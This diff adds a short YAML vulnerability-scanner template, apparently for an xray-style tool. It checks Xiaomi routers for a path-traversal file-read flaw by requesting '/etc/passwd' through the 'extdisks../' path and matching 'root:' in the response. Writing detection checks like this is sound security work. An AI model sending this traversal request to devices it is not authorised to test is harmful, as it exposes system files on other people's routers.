@@ -1,0 +1,17 @@
+name: poc-yaml-xiaomi-router-fileread
+# 脚本部分
+transport: http
+rules:
+    r1:
+        request:
+            method: GET
+            path: "/api-third-party/download/extdisks../etc/passwd"
+        expression: |
+            response.status==200 && response.body.bcontains(b'root:')
+expression:
+    r1()
+# 信息部分
+detail:
+    author: TavenLi
+    links: 
+        - https://github.com/tavenli
